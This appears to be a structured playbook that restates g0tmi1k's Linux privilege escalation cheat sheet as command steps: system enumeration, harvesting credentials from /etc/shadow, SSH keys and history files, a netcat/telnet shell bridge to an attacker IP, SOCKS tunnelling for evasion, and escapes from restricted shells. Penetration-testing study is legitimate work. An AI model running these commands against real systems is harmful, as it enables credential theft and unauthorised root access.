name: Complete Linux Privilege Escalation Vectors (Full g0tmi1k Cheat Sheet)
description: A comprehensive guide to Linux privilege escalation, covering all enumeration techniques, commands, and vectors from g0tmi1k's 2011 cheat sheet. Includes OS details, services, networking, users, file systems, and more. Enumeration is keyâ€”collect data, analyze, search exploits, adapt, and test.

tools.name: LinPEAS
tools.description: Automated enumeration script for modern Linux privesc checks

steps.name: OS Distribution and Version Enumeration
steps.command: cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release 2>/dev/null; cat /etc/redhat-release 2>/dev/null
steps.description: Identify distro type and version to research known vulnerabilities (e.g., Debian vs. RedHat).

steps.name: Kernel Version and Architecture Check
steps.command: cat /proc/version; uname -a; uname -mrs; rpm -q kernel 2>/dev/null; dmesg | grep Linux; ls /boot | grep vmlinuz-
steps.description: Gather kernel details (version, 64-bit?) for kernel exploit searches on exploit-db.com or cve.mitre.org.

steps.name: Environment Variables and Profiles
steps.command: cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
steps.description: Inspect profiles and env vars for PATH hijacks or credential leaks.

steps.name: Printer Services
steps.command: lpstat -a 2>/dev/null
steps.description: Check for CUPS or LPD printers that might expose misconfigs.

steps.name: Running Processes and Services
steps.command: ps aux; ps -ef; top; cat /etc/services
steps.description: List all processes; focus on root-owned ones for vulnerable services.

steps.name: Root-Owned Services
steps.command: ps aux | grep root; ps -ef | grep root
steps.description: Double-check root services for known CVEs or weak configs.

steps.name: Installed Applications and Versions
steps.command: ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l 2>/dev/null; rpm -qa 2>/dev/null; ls -alh /var/cache/apt/archives/ 2>/dev/null; ls -alh /var/cache/yum/ 2>/dev/null
steps.description: Catalog binaries and packages; search for vulnerable versions.

steps.name: Service Configuration Files
steps.command: cat /etc/syslog.conf 2>/dev/null; cat /etc/httpd.conf 2>/dev/null; cat /etc/lighttpd.conf 2>/dev/null; cat /etc/cups/cupsd.conf 2>/dev/null; cat /etc/inetd.conf 2>/dev/null; cat /etc/apache2/apache2.conf 2>/dev/null; cat /etc/my.cnf 2>/dev/null; cat /opt/lampp/etc/httpd.conf 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
steps.description: Look for misconfigs, vulnerable plugins, or hardcoded creds in service configs.

steps.name: Scheduled Jobs and Crontabs
steps.command: crontab -l 2>/dev/null; ls -alh /var/spool/cron/; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow 2>/dev/null; cat /etc/at.deny 2>/dev/null; cat /etc/cron.allow 2>/dev/null; cat /etc/cron.deny 2>/dev/null; cat /etc/crontab; cat /etc/anacrontab; cat /var/spool/cron/crontabs/root 2>/dev/null
steps.description: Hunt for root cron jobs with writable scripts for hijacking.

steps.name: Plain Text Credentials Search
steps.command: grep -i user [filename]; grep -i pass [filename]; grep -C 5 "password" [filename]; find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 2>/dev/null
steps.description: Scan files for usernames/passwords; target Joomla-style vars.

steps.name: Network Interfaces
steps.command: /sbin/ifconfig -a 2>/dev/null; cat /etc/network/interfaces 2>/dev/null; cat /etc/sysconfig/network 2>/dev/null
steps.description: Identify NICs and connections for pivoting.

steps.name: Network Configuration (DNS, Gateway, etc.)
steps.command: cat /etc/resolv.conf; cat /etc/sysconfig/network 2>/dev/null; cat /etc/networks 2>/dev/null; iptables -L; hostname; dnsdomainname
steps.description: Map DNS, DHCP, gateway for internal recon.

steps.name: Active Connections and Services
steps.command: lsof -i; lsof -i :80 2>/dev/null; grep 80 /etc/services 2>/dev/null; netstat -antup 2>/dev/null; netstat -antpx 2>/dev/null; netstat -tulpn 2>/dev/null; chkconfig --list 2>/dev/null; chkconfig --list | grep 3:on 2>/dev/null; last; w
steps.description: Spot listening ports, connections; check runlevels.

steps.name: ARP Cache and Routing
steps.command: arp -e; route 2>/dev/null; /sbin/route -nee 2>/dev/null
steps.description: Enumerate local network hosts via ARP/MAC.

steps.name: Packet Sniffing with tcpdump
steps.command: tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 2>/dev/null
steps.description: Capture live traffic; adapt IPs/ports for recon.

steps.name: Bind Shell Setup
steps.command: nc -lvp 4444  # Attacker: Input; nc -lvp 4445  # Attacker: Output; telnet [attacker_ip] 4444 | /bin/sh | nc [local_ip] 4445  # Target: Bridge shell
steps.description: Establish interactive shell using netcat/telnet.

steps.name: Port Forwarding with rinetd/FPipe/SSH
steps.description: Redirect traffic; use rinetd for simple forwarding or SSH for secure.

steps.name: Proxy Tunneling with Proxychains
steps.command: ssh -D 127.0.0.1:9050 -N [user]@[ip]; proxychains ifconfig
steps.description: Tunnel traffic via SOCKS proxy for evasion.

steps.name: Current User and Login History
steps.command: id; who; w; last; cat /etc/passwd | cut -d: -f1; grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'; awk -F: '($3 == "0") {print}' /etc/passwd; cat /etc/sudoers 2>/dev/null; sudo -l 2>/dev/null
steps.description: List users, superusers, sudo rights, and recent logins.

steps.name: Sensitive Files (/etc/passwd, etc.)
steps.command: cat /etc/passwd; cat /etc/group; cat /etc/shadow 2>/dev/null; ls -alh /var/mail/
steps.description: Check for readable shadow file or mail spools.

steps.name: Home Directory Enumeration
steps.command: ls -ahlR /root/ 2>/dev/null; ls -ahlR /home/
steps.description: Inspect user homes for configs or keys (if accessible).

steps.name: Plain Text Passwords in Configs
steps.command: cat /var/apache2/config.inc 2>/dev/null; cat /var/lib/mysql/mysql/user.MYD 2>/dev/null; cat /root/anaconda-ks.cfg 2>/dev/null
steps.description: Target common password locations in apps/DBs.

steps.name: User History Files
steps.command: cat ~/.bash_history; cat ~/.nano_history 2>/dev/null; cat ~/.atftp_history 2>/dev/null; cat ~/.mysql_history 2>/dev/null; cat ~/.php_history 2>/dev/null
steps.description: Extract commands/history for creds or paths.

steps.name: User Profile and Mail
steps.command: cat ~/.bashrc; cat ~/.profile; cat /var/mail/root 2>/dev/null; cat /var/spool/mail/root 2>/dev/null
steps.description: Check profiles and root mail for secrets.

steps.name: SSH Keys and Configs
steps.command: cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/identity.pub 2>/dev/null; cat ~/.ssh/identity 2>/dev/null; cat ~/.ssh/id_rsa.pub 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.ssh/id_dsa.pub 2>/dev/null; cat ~/.ssh/id_dsa 2>/dev/null; cat /etc/ssh/ssh_config 2>/dev/null; cat /etc/ssh/sshd_config 2>/dev/null; cat /etc/ssh/ssh_host_dsa_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_dsa_key 2>/dev/null; cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_rsa_key 2>/dev/null; cat /etc/ssh/ssh_host_key.pub 2>/dev/null; cat /etc/ssh/ssh_host_key 2>/dev/null
steps.description: Steal or inspect SSH keys for lateral movement.

steps.name: Writable /etc/ Files
steps.command: ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null; ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null; find /etc/ -readable -type f 2>/dev/null; find /etc/ -readable -type f -maxdepth 1 2>/dev/null
steps.description: Find writable configs for service hijacks (anyone/owner/group/other).

steps.name: /var/ Directory Inspection
steps.command: ls -alh /var/log/; ls -alh /var/mail/; ls -alh /var/spool/; ls -alh /var/spool/lpd/ 2>/dev/null; ls -alh /var/lib/pgsql/ 2>/dev/null; ls -alh /var/lib/mysql/; cat /var/lib/dhcp3/dhclient.leases 2>/dev/null
steps.description: Check logs, mail, spools, DBs for leaks.

steps.name: Web Root Directories
steps.command: ls -alhR /var/www/; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache22/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null; ls -alhR /var/www/html/ 2>/dev/null
steps.description: Hunt for web app configs, backups, or LFI-vulnerable files.

steps.name: Log Files Enumeration
steps.command: cat /etc/httpd/logs/access_log 2>/dev/null; cat /etc/httpd/logs/access.log 2>/dev/null; cat /etc/httpd/logs/error_log 2>/dev/null; cat /etc/httpd/logs/error.log 2>/dev/null; cat /var/log/apache2/access_log 2>/dev/null; cat /var/log/apache2/access.log 2>/dev/null; cat /var/log/apache2/error_log 2>/dev/null; cat /var/log/apache2/error.log 2>/dev/null; cat /var/log/apache/access_log 2>/dev/null; cat /var/log/apache/access.log 2>/dev/null; cat /var/log/auth.log 2>/dev/null; cat /var/log/chttp.log 2>/dev/null; cat /var/log/cups/error_log 2>/dev/null; cat /var/log/dpkg.log 2>/dev/null; cat /var/log/faillog 2>/dev/null; cat /var/log/httpd/access_log 2>/dev/null; cat /var/log/httpd/access.log 2>/dev/null; cat /var/log/httpd/error_log 2>/dev/null; cat /var/log/httpd/error.log 2>/dev/null; cat /var/log/lighttpd/access.log 2>/dev/null; cat /var/log/lighttpd/error.log 2>/dev/null; cat /var/log/lighttpd/lighttpd.access.log 2>/dev/null; cat /var/log/lighttpd/lighttpd.error.log 2>/dev/null; cat /var/log/messages 2>/dev/null; cat /var/log/secure 2>/dev/null; cat /var/log/syslog 2>/dev/null; cat /var/log/wtmp 2>/dev/null; cat /var/log/xferlog 2>/dev/null; cat /var/log/yum.log 2>/dev/null; cat /var/run/utmp 2>/dev/null; cat /var/webmin/miniserv.log 2>/dev/null; cat /var/www/logs/access_log 2>/dev/null; cat /var/www/logs/access.log 2>/dev/null; ls -alh /var/lib/dhcp3/ 2>/dev/null; ls -alh /var/log/postgresql/ 2>/dev/null; ls -alh /var/log/proftpd/ 2>/dev/null; ls -alh /var/log/samba/ 2>/dev/null
steps.description: Scan all common logs for creds, errors, or LFI paths (auth.log, syslog, etc.).

steps.name: Jailbreak Limited Shell
steps.command: python -c 'import pty; pty.spawn("/bin/bash")'; echo os.system('/bin/bash'); /bin/sh -i
steps.description: Escape restricted shells for full interaction.

steps.name: Mounted File Systems
steps.command: mount; df -h; cat /etc/fstab
steps.description: Check mounts for noexec/nosuid or unmounted shares.
